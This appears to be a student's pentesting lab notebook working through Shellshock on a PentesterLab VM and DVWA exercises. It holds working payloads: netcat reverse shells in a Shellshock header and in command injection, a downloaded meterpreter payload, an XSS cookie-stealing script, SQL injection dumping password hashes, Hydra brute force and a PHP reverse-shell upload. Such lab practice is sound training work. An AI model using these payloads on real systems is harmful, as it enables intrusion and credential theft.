1. shellshock
    CVE-2014-6271.iso -> virtualbox

    over burpsuite:

        HTTP request:
            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
        
        HTTP response:
            {
                "uptime": " 13:11:03 up 0 min, 1 users, load average: 0.00, 0.00, 0.00", 
                "kernel": "Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux"
            } 
        

        send this to repeater:
            nc -lvp 5555
            User-Agent: () { :;}; /bin/bash -c 'nc <HACKER IP> 5555 -e /bin/bash'
            
            got shell 
                whoami
                pentesterlab


    over terminal:
        sudo curl -H "user-agent: () { :;}; /bin/bash -c 'nc <HACKER IP> 5555 -e /bin/bash'" \http://<VICTIM IP>/cgi-bin/status


    using msfconsole:
        use exploit/multi/http/apache_mod_cgi_bash_env_exec
        set rhosts <VICTIM IP>
        set targeturi /cgi-bin/status
        run -> works


2. command execution
    http://<VICTIM IP>/dvwa/vulnerabilities/exec/

    -> forwards command to a server that executes it... lets exploit
        ';whoami' -> www-data

        lets start a listener: $ nc -lvp 5555
        '; nc -e /bin/bash <HACKER IP> 5555' -> gives shell -> low level securty
        '| nc -e /bin/bash <HACKER IP> 5555' -> gives shell -> mid level securty


    lets get meterpreter shell:
        msfvenom -p python/meterpreter/reverse_tcp LHOST=<HACKER IP> LPORT=5555 >> meterpreter32bit.py

        lets host a web server so that the machine can download it
            python3 -m http.server 80

        '| wget <HACKER IP>/meterpreter32bit.py'
        let set up a listener in msfconsole: $ use exploit/multi/handler  ...
        '| python meterpreter32bit.py'

        got meterpreter !!!

3. XSS Reflected
    http://<VICTIM IP>/dvwa/vulnerabilities/xss_r/ -> asks for a name -> prints it back with Hello + name

    <script>alert('1')</script> -> low securty
    <SCRIPT>alert('1')</SCRIPT>
    <sc<script>ript>alert('1')</script> -> mid securty

    
    lets steal cookies from a person that clicks to a link
        lets start http server in python: $ python -m SimpleHTTPServer 8000

        <scr<script>ipt>document.write('<img src="http://<HACKER IP>:8000/' + document.cookie + ' ">');</script>
            -> GET /security=medium;%20PHPSESSID=b450d4aea9a0f552d113786e6d56c750 HTTP/1.1

4, XSS Stored
    http://<VICTIM IP>/dvwa/vulnerabilities/xss_s/ -> asks for Name and Message -> stores it on the website

    executes it every time you visit a site


5. HTML injectioon
    harmless, but still a bug -> <meta http-equiv="refresh" content="0; url=http://bing.com"/> -> always redirects to bing


6. SQL injection
    http://<VICTIM IP>/dvwa/vulnerabilities/sqli/

    search for user ID 
        -> for 1 returns First name: admin Surname: admin

    2' and '1'='1 

    2' order by 1 -- '

    2' union select 1,2 -- '

    2' union select database(), user() -- ' ->   First name: dvwa
                                                Surname: root@localhost

    2' union select schema_name, 2 from information_schema.schemata -- ' -> metasploit, mysql, tikiwiki195, owasp10, tikiwiki

    2' union select table_name, 2 from information_schema.tables where table_schema='dvwa' -- ' -> guestbook, users

    2' union select column_name, column_type from information_schema.columns where table_schema='dvwa' and table_name = 'users' -- ' -> user_id, first_name, last_name, password, user, avatar

    2' union select concat(user_id, ':', first_name, ':', last_name), concat(user,':',password) from dvwa.users -- '
        -> gives everything
            ID: 2' union select concat(user_id, ':', first_name, ':', last_name), concat(user,':',password) from dvwa.users -- '
            First name: 1:admin:admin
            Surname: admin:5f4dcc3b5aa765d61d8327deb882cf99

            ID: 2' union select concat(user_id, ':', first_name, ':', last_name), concat(user,':',password) from dvwa.users -- '
            First name: 2:Gordon:Brown
            Surname: gordonb:e99a18c428cb38d5f260853678922e03

            ID: 2' union select concat(user_id, ':', first_name, ':', last_name), concat(user,':',password) from dvwa.users -- '
            First name: 3:Hack:Me
            Surname: 1337:8d3533d75ae2c3966d7e0d4fcc69216b

            ID: 2' union select concat(user_id, ':', first_name, ':', last_name), concat(user,':',password) from dvwa.users -- '
            First name: 4:Pablo:Picasso
            Surname: pablo:0d107d09f5bbe40cade3de5c71e9e9b7

            ID: 2' union select concat(user_id, ':', first_name, ':', last_name), concat(user,':',password) from dvwa.users -- '
            First name: 5:Bob:Smith
            Surname: smithy:5f4dcc3b5aa765d61d8327deb882cf99


7. Cross Site Request Forgery (CSRF)
    python3 -m http.server 80
    click change on localhost/csrf.html -> test.html is with css

    admin password changed to hacked!!! Make them click on a link...


8. Brute force attacks
    hydra <VICTIM IP> http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -L users.txt -P passwords.txt

            "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" got from website source...

    [DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:3/p:8), ~2 tries per task
    [DATA] attacking http-post-form://<VICTIM IP>:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed
    [80][http-post-form] host: <VICTIM IP>   login: admin   password: testtest
    [80][http-post-form] host: <VICTIM IP>   login: Admin   password: testtest
    1 of 1 target successfully completed, 2 valid passwords found

    admin/testtest


    http://<VICTIM IP>/dvwa/vulnerabilities/brute/ using burpsuite

    find request in burp suite -> send to intruder -> positions -> cluster bomb -> clear -> doubleclick + add for user and password fields -> load users and passwords files -> follow redirections -> start attack -> look for different lengths!!! 
    Got -> Admin/testtest and admin/testtest!!!


9. File upload
    using https://github.com/pentestmonkey/php-reverse-shell

	lets make a listener with $ nc -nvlp 1234
	
    lets upload that shell.php file -> http://<VICTIM IP>/hackable/uploads/shell.php -> we are in as www-data user